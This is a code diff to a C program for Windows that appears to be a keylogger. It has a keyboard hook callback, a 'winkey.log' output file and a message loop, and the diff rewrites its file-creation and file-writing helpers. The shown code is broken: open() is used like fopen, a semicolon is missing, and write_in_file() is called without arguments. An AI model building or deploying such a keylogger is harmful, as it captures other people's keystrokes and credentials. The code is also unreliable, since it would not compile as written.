@@ -58,8 +58,8 @@ LRESULT CALLBACK foo(int ncode, WPARAM wparam, LPARAM lparam)
     return (CallNextHookEx(NULL, ncode, wparam, lparam));
 }
 
-int	create_file(int fd) {
-	fd = creat("winkey.log", 0644);
+int	create_file(const char *path) {
+	int fd = creat(path, 0644);
 	if (fd == -1)
 	{
 		perror("Can't create file");
@@ -68,18 +68,25 @@ int	create_file(int fd) {
 	return 0;
 }
 
-int	read_file(char *path, int fd)
+int write_in_file(const char *path, const char *msg)
 {
-	int lol = open(path, O_RWONLY, fd);
-	if (lol < 0) {
-		perror("can't read file");
+	FILE *file = open(path, "a")
+	if (!file) {
+		perror("can't open file");
+		return 1;
+	}
+
+	if (fprintf(file, "%s\n", msg) < 0) {
+		perror("error");
+		fclose(file);
+		return 1;
+	}
+	if (fclose(file) != 0) {
+		perror("error close file");
 		return 1;
 	}
 	return 0;
 }
-
-int write_in_file(char *path, int fd)
-
 
 int main(void)
 {
@@ -97,7 +104,8 @@ int main(void)
     }
 
     printf("Hook ok: %p\n", (void*)hook);
-
+	create_file("winkey.log");
+	write_in_file()
     while (GetMessage(&msg, NULL, 0, 0))
     {
         //forground_process();
